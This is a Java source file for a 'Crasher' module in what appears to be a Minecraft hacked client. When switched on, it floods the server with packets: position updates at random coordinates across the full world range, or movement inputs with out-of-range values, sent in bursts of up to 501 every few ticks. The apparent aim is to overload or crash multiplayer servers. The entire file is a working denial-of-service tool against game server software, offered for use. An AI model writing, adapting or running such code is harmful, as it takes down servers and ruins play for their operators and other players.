package de.tudbut.mod.client.ttcp.mods.misc;

import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketInput;
import net.minecraft.network.play.client.CPacketPlayer;
import de.tudbut.mod.client.ttcp.TTCp;
import de.tudbut.mod.client.ttcp.utils.Module;
import de.tudbut.mod.client.ttcp.utils.Setting;
import de.tudbut.mod.client.ttcp.utils.category.Misc;
import de.tudbut.obj.Save;

@Misc
public class Crasher extends Module {
    
    boolean run = false;
    
    @Save
    int timer = 5;
    @Save
    int instances = 5;
    @Save
    int type = 0;
    
    int i = 0;
    
    @Override
    public void updateBinds() {
        subComponents.clear();
        subComponents.add(Setting.createBoolean("Run", this, "run"));
        subComponents.add(Setting.createInt(0, 60, "DelayTicks", this, "timer"));
        subComponents.add(Setting.createInt(0, 500, "Instances", this, "instances"));
        subComponents.add(Setting.createInt(0, 1, "Type", this, "type"));
    }
    
    @Override
    public void onSubTick() {
        i++;
        if(i >= timer + 1) {
            i = 0;
            if(run)
                for (int j = 0; j < instances + 1; j++) {
                    TTCp.player.connection.sendPacket(packet());
                }
        }
    }
    
    public Packet<?> packet() {
        if(type == 0) {
            return new CPacketPlayer.PositionRotation(
                    Math.random() * 60_000_000 - 30_000_000,
                    Math.random() * 256,
                    Math.random() * 60_000_000 - 30_000_000,
                    (float) (Math.random() * 360) - 180,
                    (float) (Math.random() * 360) - 180,
                    true
            );
        }
        if(type == 1) {
            return new CPacketInput(
                    (float) (Math.random() * 1000) - 500,
                    (float) (Math.random() * 1000) - 500,
                    false, false
            );
        }
        
        return null;
    }
}
